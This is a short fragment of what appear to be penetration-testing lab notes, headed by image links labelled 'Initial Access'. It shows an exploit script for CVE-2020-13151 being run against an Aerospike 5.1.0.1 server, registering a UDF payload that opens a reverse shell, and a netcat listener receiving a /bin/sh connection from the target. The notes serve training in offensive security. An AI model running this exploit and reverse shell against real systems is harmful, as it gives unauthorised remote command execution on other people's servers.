└─$ ~/venv3/bin/python3 ./cve2020-13151.py --ahost 192.168.233.143  --netcatshell --lhost 192.168.45.186 --lport 443

\[+\] aerospike build info: 5.1.0.1

\[+\] looks vulnerable

\[+\] populating dummy table.

\[+\] writing to test.cve202013151

\[+\] wrote GSiJGOBLICDfdbAm

\[+\] registering udf

\[+\] sending payload, make sure you have a listener on 192.168.45.186:443.....

![[Initial Access image 62.png]]

─$ rlwrap -cAr nc -lvnp 443

listening on \[any\] 443 ...

connect to \[192.168.45.186\] from (UNKNOWN) \[192.168.233.143\] 45632

/bin/sh: 0: can't access tty; job control turned off

![[Initial Access image 63.png]]